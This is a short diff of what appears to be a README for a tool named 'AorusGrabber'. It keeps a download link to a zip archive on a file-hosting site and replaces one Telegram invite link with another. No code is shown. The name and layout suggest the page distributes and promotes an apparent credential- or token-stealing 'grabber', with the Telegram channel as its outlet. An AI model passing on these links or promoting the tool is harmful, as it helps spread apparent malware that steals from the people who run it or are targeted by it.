@@ -13,7 +13,7 @@
 > [Download](https://store3.gofile.io/download/49824358-1f01-4d75-bd25-dbf6bbffd238/AorusGrabber.zip)
 
 <h2 align="center">
- https://t.me/+WvJrz6yv5AxkYjY8
+https://t.me/+6iVfQAo6lt5lZjA0
 </h2>
 
 
